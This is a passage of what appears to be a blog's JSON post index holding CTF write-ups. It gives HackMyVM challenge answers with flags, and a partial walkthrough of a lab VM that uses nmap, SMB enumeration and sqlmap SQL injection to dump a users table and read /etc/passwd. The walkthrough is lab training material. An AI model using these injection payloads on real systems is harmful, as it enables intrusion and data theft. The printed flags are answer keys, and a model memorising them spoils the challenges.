flag{xxx}\n```\n\nbase64\u89e3\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ echo 'SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg=='|base64 -d\nH.\\.[).\\).[).\\.[.\\\uc397.H)....\n```\n\nkey:kerszi\n\nxor\n\n![image-20250803104615642](http://7r1UMPHK.github.io/image/20250803104615923.webp)\n\n```\nF R U' R' U' R U R' F'    \n```\n\n\u9b54\u6cd5\u65b9\u7a0b\n\nhttps://rubikscu.be/\n\n![image-20250803110156219](http://7r1UMPHK.github.io/image/20250803110156383.webp)\n\n```bash\nflag{T}\n```\n\nsentence", "top": 0, "createdAt": 1754440829, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P175": {"htmlDir": "docs/post/Challenge 088.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 088", "postUrl": "post/Challenge%20088.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/175", "commentNum": 0, "wordCount": 153, "description": "![image-20250803110319152](http://7r1UMPHK.github.io/image/20250803110319359.webp)\n\n\u97f3\u9891\u9898\uff0c\u8fd8\u662fta0\u51fa\u7684\uff0c\u90a3\u53bb\u542c\u542c\u600e\u4e48\u8bfb\u7684\n\n\u6211\u542c\u4e86\u534a\u5929\uff0c\u7ed3\u679cai\u542c\u51fa\u6765\u4e86\uff0c666\n\n```\nHMV{IlikeChinese}\n```\n\nsentence", "top": 0, "createdAt": 1754440847, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P176": {"htmlDir": "docs/post/Challenge 089.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 089", "postUrl": "post/Challenge%20089.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/176", "commentNum": 0, "wordCount": 385, "description": "![image-20250803111300907](http://7r1UMPHK.github.io/image/20250803111301164.webp)\n\n```\nN2QgNmUgNzUgNjYgNWYgNzMgMzEgNWYgNjcgNmUgMzEgNzIgMzMgNjggNzAgMzEgNjMgMzMgNDQgN2IgNDcgNDEgNGMgNDY\n```\n\n![image-20250803111333055](http://7r1UMPHK.github.io/image/20250803111333344.webp)\n\n```\n}nuf_s1_gn1r3hp1c3D{GALF\n```\n\n\u53cd\u5411\u4e66\u5199\n\nhttps://www.dcode.fr/reverse-writing\n\n```\nFLAG{D3c1ph3r1ng_1s_fun}\n```\n\nsentence", "top": 0, "createdAt": 1754440864, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P177": {"htmlDir": "docs/post/nei-bu-_Mutli.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Mutli", "postUrl": "post/nei-bu-_Mutli.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/177", "commentNum": 0, "wordCount": 52050, "description": "![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)\n\n\u7b80\u5355\u590d\u73b0\u4e00\u4e0b\uff0c\u770b\u6837\u5b50\u540e\u9762\u662f\u51c6\u5907\u653e\u53bbHMV\u7684\u3002\u5176\u4e2dtodd-->\u6211\u662f\u95ee\u7fa4\u4e3b\u62ff\u4e86\u63d0\u793a\uff0c\u618b\u4e0d\u51fa\u6765\u4e86\uff0c\u54c8\u54c8\u54c8\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n# 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u5185\u7f51\u73af\u5883\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u4ee5\u53d1\u73b0\u5b58\u6d3b\u7684\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.205 08:00:27:b2:39:7d       PCS Systemtechnik GmbH\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc. (DUP: 2)\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\u4e3a  `192.168.205.205`\u3002\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807 IP \u540e\uff0c\u4f7f\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u8be6\u7ec6\u7684\u7aef\u53e3\u626b\u63cf\uff0c\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.205\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:01 EDT\nNmap scan report for 192.168.205.205\nHost is up (0.00015s latency).\nNot shown: 65521 closed tcp ports (reset)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n22/tcp    open  ssh\n23/tcp    open  telnet\n80/tcp    open  http\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n2049/tcp  open  nfs\n3306/tcp  open  mysql\n28080/tcp open  thor-engine\n38007/tcp open  unknown\n46413/tcp open  unknown\n50129/tcp open  unknown\n53115/tcp open  unknown\nMAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.07 seconds\n```\n\n\u8fd9\u91cc\u6211\u8fd8\u4ee5\u4e3a\u6211\u773c\u82b1\u4e86\uff0c\u6211\u8fd8\u91cd\u65b0\u626b\u4e86\u4e00\u904d\uff0c\u786e\u5b9eMutli\uff0c\u54c8\u54c8\u54c8\n\n\u626b\u63cf\u4e00\u4e0b\u5177\u4f53\u670d\u52a1\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p21,22,23,80,111,139,445,2049,3306,28080,38007,46413,50129,53115 -sC -sV 192.168.205.205 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:02 EDT\nNmap scan report for 192.168.205.205\nHost is up (0.00026s latency).\n\nPORT      STATE SERVICE     VERSION\n21/tcp    open  ftp         vsftpd 3.0.3\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN\n| Not valid before: 2025-07-17T11:34:00\n|_Not valid after:  2035-07-15T11:34:00\n22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n23/tcp    open  telnet      Linux telnetd\n80/tcp    open  http        Apache httpd 2.4.62 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.62 (Debian)\n111/tcp   open  rpcbind     2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      35543/tcp6  mountd\n|   100005  1,2,3      35639/udp6  mountd\n|   100005  1,2,3      53115/tcp   mountd\n|   100005  1,2,3      57320/udp   mountd\n|   100021  1,3,4      37033/udp6  nlockmgr\n|   100021  1,3,4      45001/tcp6  nlockmgr\n|   100021  1,3,4      45069/udp   nlockmgr\n|   100021  1,3,4      46413/tcp   nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n139/tcp   open  netbios-ssn Samba smbd 4\n445/tcp   open  netbios-ssn Samba smbd 4\n2049/tcp  open  nfs         3-4 (RPC #100003)\n3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)\n28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)\n|_http-server-header: Werkzeug/3.1.3 Python/3.9.2\n|_http-title: Admin Panel\n38007/tcp open  mountd      1-3 (RPC #100005)\n46413/tcp open  nlockmgr    1-4 (RPC #100021)\n50129/tcp open  mountd      1-3 (RPC #100005)\n53115/tcp open  mountd      1-3 (RPC #100005)\nMAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb2-time: \n|   date: 2025-07-22T03:02:46\n|_  start_date: N/A\n|_nbstat: NetBIOS name: MULTI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.30 seconds\n```\n\n- **web** 80,28080\n- **\u5171\u4eab\u670d\u52a1** 2049\n- **samba** 139/445\n- **FTP** 21\n- **\u6570\u636e\u5e93** 3306\n- **\u4f20\u7edf\u7aef\u53e3** 22,23\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\n\n## ftp\n\n\u6211\u6bd4\u8f83\u559c\u6b22\u5148\u770bFTP\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ftp 192.168.205.205\nConnected to 192.168.205.205.\n220 (vsFTPd 3.0.3)\nName (192.168.205.205:kali): anonymous\n530 Permission denied.\nftp: Login failed\nftp> exit\n221 Goodbye.\n```\n\n\u533f\u540d\u767b\u5f55\u5931\u8d25\n\n## NFS\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ showmount -e 192.168.205.205\nExport list for 192.168.205.205:\n/srv/nfs_secure 127.0.0.1\n```\n\n\u53ea\u53ef\u4ee5\u4ed6\u672c\u5730\u6302\u8f7d\uff0c\u4e0b\u4e00\u4e2a\n\n## **Samba**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient -L //192.168.205.205 -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        secure_share    Disk      \n        IPC$            IPC       IPC Service (Secure Samba Server)\nReconnecting with SMB1 for workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.205.205 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n                                              \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd tmp                                        \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ smbclient //192.168.205.205/secure_share -N \nTry 'help' to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Fri Jul 18 11:22:38 2025\n  ..                                  D        0  Thu Jul 17 07:40:23 2025\n  bettercap                           N      159  Fri Jul 18 11:22:38 2025\n\n                29801344 blocks of size 1024. 25516556 blocks available\nsmb: \\> get bettercap \ngetting file \\bettercap of size 159 as bettercap (31.1 KiloBytes/sec) (average 31.1 KiloBytes/sec)\nsmb: \\> exit\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat bettercap   \nbettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers\n```\n\n\u8fd9\u4e2a\u7b97\u4e2a\u63d0\u793a\u5427\uff0cbettercap\u6bd4\u8f83\u51fa\u540d\u7684\u5c31\u662f\u4e8c\u3001\u4e09\u5c42\u653b\u51fb\uff0c\u8fd9\u662f\u540e\u9762\u7684\u4e8b\u60c5\u4e86\n\n## mysql\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mysql -h 192.168.205.205 -u root -p\nEnter password: \nERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mysql -h 192.168.205.205 -u root -p --skip-ssl\nEnter password: \nERROR 1130 (HY000): Host '192.168.205.128' is not allowed to connect to this MariaDB server\n```\n\n\u4e0d\u5141\u8bb8\u6211\u4eec\u8fde\u63a5\uff0c\u4e0d\u767d\u8d39\u529b\u6c14\u4e86\n\n## web\n\n80\u7684\u4e3b\u9875\u662fapache2\u7684\u521d\u59cb\u9875\uff0c\u5c1d\u8bd5\u7206\u7834\u76ee\u5f55\uff0c\u6ca1\u6709\u4efb\u4f55\u6536\u83b7\n\n28080\u6709\u4e1c\u897f\n\n![image-20250722153917170](https://7r1UMPHK.github.io/image/20250722153917297.webp)\n\n\u8ba9\u6211\u4eec\u8f93\u5165\u7528\u6237\u540d\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u4ec0\u4e48\u540d\u5b57\u90fd\u53ef\u4ee5\uff0c\u6ca1\u6709sql\uff0cssti\u4e4b\u7c7b\u7684\u5c31\u5355\u7eaf\u4f7f\u7528\u7684user\n\n\u8f93\u5165user\u540e\u4f1a\u8df3\u8f6c\u5230search\n\n![image-20250722154042672](https://7r1UMPHK.github.io/image/20250722154042794.webp)\n\n\u53ef\u4ee5\u8f93\u5165\u4e00\u4e9b\u7528\u6237\u540d\u7ee7\u7eed\u67e5\u770b\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u6709sql\u6ce8\u5165\uff08\u53bbburp\u6293\u4e2a\u5305\uff0c\u7136\u540esqlmap -r\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 1               \nPOST /search HTTP/1.1\nHost: 192.168.205.205:28080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://192.168.205.205:28080\nConnection: keep-alive\nReferer: http://192.168.205.205:28080/search\nCookie: session=eyJ1c2VyIjoiYSJ9.aH9ASQ.1M-ZU-QfKjkL88N2Pyia0ZmKDkM\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nkeyword=1                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sqlmap -r 1 --batch            \n        ___\n       __H__\n ___ ___[(]_____ ___ ___  {1.9.6#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:44:08 /2025-07-22/\n\n[03:44:08] [INFO] parsing HTTP request from '1'\n[03:44:08] [INFO] testing connection to the target URL\n[03:44:08] [INFO] checking if the target is protected by some kind of WAF/IPS\n[03:44:08] [INFO] testing if the target URL content is stable\n[03:44:08] [INFO] target URL content is stable\n[03:44:08] [INFO] testing if POST parameter 'keyword' is dynamic\n[03:44:08] [WARNING] POST parameter 'keyword' does not appear to be dynamic\n[03:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'keyword' might not be injectable\n[03:44:08] [INFO] testing for SQL injection on POST parameter 'keyword'\n[03:44:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[03:44:09] [WARNING] reflective value(s) found and filtering out\n[03:44:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[03:44:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[03:44:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[03:44:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'\n[03:44:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[03:44:09] [INFO] testing 'Generic inline queries'\n[03:44:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[03:44:19] [INFO] POST parameter 'keyword' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable \nit looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[03:44:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[03:44:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[03:44:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[03:44:19] [INFO] target URL appears to have 3 columns in query\n[03:44:19] [INFO] POST parameter 'keyword' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nPOST parameter 'keyword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:\n---\nParameter: keyword (POST)\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries (comment)\n    Payload: keyword=1';SELECT PG_SLEEP(5)--\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr\n---\n[03:44:19] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[03:44:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'\n\n[*] ending @ 03:44:19 /2025-07-22/\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sqlmap -r 1 --batch -D public -T users --dump                             \n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.6#stable}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:44:40 /2025-07-22/\n\n[03:44:40] [INFO] parsing HTTP request from '1'\n[03:44:40] [INFO] resuming back-end DBMS 'postgresql' \n[03:44:40] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries (comment)\n    Payload: keyword=1';SELECT PG_SLEEP(5)--\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr\n---\n[03:44:40] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[03:44:40] [INFO] fetching columns for table 'users' in database 'public'\n[03:44:40] [WARNING] reflective value(s) found and filtering out\n[03:44:40] [INFO] fetching entries for table 'users' in database 'public'\nDatabase: public\nTable: users\n[4 entries]\n+----+-----------------+----------+\n| id | email           | username |\n+----+-----------------+----------+\n| 1  | admin@multi.hmv | admin    |\n| 2  | guest@multi.hmv | guest    |\n| 3  | test@multi.hmv  | test     |\n| 4  | xiao@multi.hmv  | xiao     |\n+----+-----------------+----------+\n\n[03:44:40] [INFO] table 'public.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.205/dump/public/users.csv'\n[03:44:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'\n\n[*] ending @ 03:44:40 /2025-07-22/\n```\n\n\u6709\u57df\u540d\uff0c\u52a0\u57df\u540d\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo vim /etc/hosts                          \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ tail -n 1 /etc/hosts                                                                                                                          \n192.168.205.205 multi.hmv \n                \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ wfuzz -c -u 'http://multi.hmv/' -H 'HOST:FUZZ.multi.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 933\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://multi.hmv/\nTotal requests: 114442\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                          \n=====================================================================\n\n000009532:   400        10 L     35 W       301 Ch      '#www - #www'                                                                                                    \n000010581:   400        10 L     35 W       301 Ch      '#mail - #mail'                                                                                                  \n000047706:   400        10 L     35 W       301 Ch      '#smtp - #smtp'                                                                                                  \n000103135:   400        10 L     35 W       301 Ch      '#pop3 - #pop3'                                                                                                  \n\nTotal time: 68.80952\nProcessed Requests: 114442\n```\n\n\u7136\u540e\u91cd\u65b0\u7206\u7834\u76ee\u5f55\uff0c\u6ca1\u6709\u6536\u83b7\n\n\u7740\u91cd\u6252\u62c9\u4e86\u4e00\u4e0bsql\uff0c\u590d\u73b0\u53ef\u4ee5\u8bfb\u6587\u4ef6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.9.6#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:42:07 /2025-07-21/\n\n[23:42:07] [INFO] parsing HTTP request from 'tmp/1'\n[23:42:07] [INFO] resuming back-end DBMS 'postgresql' \n[23:42:07] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[23:42:07] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[23:42:07] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'\n[23:42:07] [WARNING] reflective value(s) found and filtering out\nSELECT pg_read_file('/etc/passwd', 0, 1000000): 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\\nxiao:x:1001:1001::/home/xiao:/bin/bash\\ntelnetd:x:106:113::/nonexistent:/usr/sbin/nologin\\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\\nftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\\nsecure_user:x:1002:1002::/home/secure_user:/bin/bash\\nmysql:x:109:116:MySQL 